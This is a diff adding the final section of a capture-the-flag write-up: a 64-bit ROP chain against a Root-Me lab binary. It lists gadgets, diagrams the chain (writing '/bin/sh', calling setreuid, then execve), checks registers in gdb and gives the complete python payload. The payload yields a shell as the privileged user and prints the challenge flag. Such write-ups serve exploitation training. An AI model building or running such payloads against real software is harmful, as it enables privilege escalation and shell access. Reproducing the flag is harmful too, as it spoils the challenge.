@@ -184,8 +184,140 @@ fs             0x0	0
 gs             0x0	0
 ```
 Step 2 is complete :sunglasses: One last step remain.<br>
-(Note: Because the third gadget mess up with the _rsp_, we'll have to correct it by filling up the buffer until the new _rsp_ value.)
+(Note: Because the third gadget mess up with the _rsp_, we'll have to correct it by filling up the buffer until the new _rsp_ value.)<br>
 
-[TBH]
+Now for the last part (calling execve with "/bin/sh") we'll use the following gadgets:
+```asm
+0x000000000044d2b4 : pop rax ; ret
+0x00000000004016d3 : pop rdi ; ret
+0x00000000004017e7 : pop rsi ; ret
+0x0000000000437205 : pop rdx ; ret
+0x0000000000400488 : syscall ; add rsp, 0x600 ; pop rbx ; pop rbp ; pop r12; ret
+```
+So, the chain will look like the following:
+```
++---------------------------+
+|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
++---------------------------+
+|    0x000000000000003b     |         ;   the new value of rax (the value of sys_execve syscall)
++---------------------------+
+|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
++---------------------------+
+|    0x00000000006bfe40     |         ;   the new value of rdi (the address to "/bin/sh\x00" which was set before)
++---------------------------+
+|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
++---------------------------+
+|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no arguments needed)
++---------------------------+
+|    0x0000000000437205     |         ;   for setting the rdx value (fourth gadget)
++---------------------------+
+|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no environment variables needed)
++---------------------------+
+|    0x0000000000400488     |         ;   for triggering the syscall
++---------------------------+
+```
+
+Again (and for the last time), let's verify the chain:
+```gdb
+(gdb) run < <(python -c "print 'A'*280 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x40\xfe\x6b\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x05\x72\x43\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'")
+Starting program: /challenge/app-systeme/ch34/ch34 < <(python -c "print 'A'*280 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x40\xfe\x6b\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x05\x72\x43\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'")
+Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffb4ffffffd244
+
+Breakpoint 1, 0x0000000000400488 in backtrace_and_maps ()
+(gdb) info registers
+rax            0x3b	59
+rbx            0x4002b0	4194992
+rcx            0x434310	4408080
+rdx            0x0	0
+rsi            0x0	0
+rdi            0x6bfe40	7077440
+rbp            0x4141414141414141	0x4141414141414141
+rsp            0x7ffe36af3bb0	0x7ffe36af3bb0
+r8             0xa	10
+r9             0x2297880	36272256
+r10            0x22	34
+r11            0x246	582
+r12            0x0	0
+r13            0x401760	4200288
+r14            0x4017f0	4200432
+r15            0x0	0
+rip            0x400488	0x400488 <backtrace_and_maps+183>
+eflags         0x246	[ PF ZF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+```
+As you may see, _rax_ is set to the sys_execve syscall, _rdi_ is set to our address of "/bin/sh\x00", and _rsi_ and _rdx_ are set to NULL (0). Awesome! Now lets combine all of the chains into one big chain. We should remember the the syscall's gadget is messing up the _sp_ value, so we'll need to fill those bytes with junks:
+```
++---------------------------+
+|    280 bytes of junk      |         ;   triggering the overflow for controlling the rip
++---------------------------+
+|    0x00000000004016d3     |         ;   for setting the rdi value (first gadget)
++---------------------------+
+|    0x00000000006bfe42     |         ;   the first word address (notice the third gadget has -2)
++---------------------------+
+|    0x00000000004b81a7     |         ;   for setting the rcx value (second gadget)
++---------------------------+
+|  "/bin\x00\x00\x00\x00"   |         ;   the first word's value (because we write ecx to memory)
++---------------------------+
+|    0x0000000000427a3d     |         ;   for writing the data (third gadget)
++---------------------------+
+|    0x00000000004016d3     |         ;   for setting the rdi value (first gadget)
++---------------------------+
+|    0x00000000006bfe46     |         ;   the second word address (notice the third gadget has -2)
++---------------------------+
+|    0x00000000004b81a7     |         ;   for setting the rcx value (second gadget)
++---------------------------+
+| "/sh\x00\x00\x00\x00\x00" |         ;   the second word's value (because we write ecx to memory)
++---------------------------+
+|    0x0000000000427a3d     |         ;   for writing the data (third gadget)
++---------------------------+
+|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
++---------------------------+
+|    0x0000000000000071     |         ;   the new value of rax (the value of sys_setreuid syscall)
++---------------------------+
+|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
++---------------------------+
+|    0x000000000000042d     |         ;   the new value of rdi (the value of the app-systeme-ch34-cracked uid)
++---------------------------+
+|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
++---------------------------+
+|    0x000000000000042d     |         ;   the new value of rsi (the value of the app-systeme-ch34-cracked uid)
++---------------------------+
+|    0x0000000000400488     |         ;   for triggering the syscall
++---------------------------+
+|    1560 bytes of junk     |         ;   the syscall's gadget adds 1560 (0x600 + 3 pops)
++---------------------------+
+|    0x000000000044d2b4     |         ;   for setting the rax value (first gadget)
++---------------------------+
+|    0x000000000000003b     |         ;   the new value of rax (the value of sys_execve syscall)
++---------------------------+
+|    0x00000000004016d3     |         ;   for setting the rdi value (second gadget)
++---------------------------+
+|    0x00000000006bfe40     |         ;   the new value of rdi (the address to "/bin/sh\x00" which was set before)
++---------------------------+
+|    0x00000000004017e7     |         ;   for setting the rsi value (third gadget)
++---------------------------+
+|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no arguments needed)
++---------------------------+
+|    0x0000000000437205     |         ;   for setting the rdx value (fourth gadget)
++---------------------------+
+|    0x0000000000000000     |         ;   the new value of rsi (sets to NULL - no environment variables needed)
++---------------------------+
+|    0x0000000000400488     |         ;   for triggering the syscall
++---------------------------+
+```
+Let's try it out:
+```sh
+app-systeme-ch34@challenge03:~$ cat <(python -c "print 'A'*280 + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x42\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/bin\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x46\xfe\x6b\x00\x00\x00\x00\x00' + '\xa7\x81\x4b\x00\x00\x00\x00\x00' + '/sh\x00\x00\x00\x00\x00' + '\x3d\x7a\x42\x00\x00\x00\x00\x00' + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x71\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\xd2\x04\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00' + 'B'*1560 + '\xb4\xd2\x44\x00\x00\x00\x00\x00' + '\x3b\x00\x00\x00\x00\x00\x00\x00' + '\xd3\x16\x40\x00\x00\x00\x00\x00' + '\x40\xfe\x6b\x00\x00\x00\x00\x00' + '\xe7\x17\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x05\x72\x43\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x88\x04\x40\x00\x00\x00\x00\x00'") - | ./ch34 
+Hex result: 4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141411b0100000c0100004141414141414141ffffffd31640
+id
+uid=1234(app-systeme-ch34-cracked) gid=1134(app-systeme-ch34) groups=1134(app-systeme-ch34),100(users)
+cat .passwd
+BufFErOvErFlOw-In-64-BiTs
+```
 
 
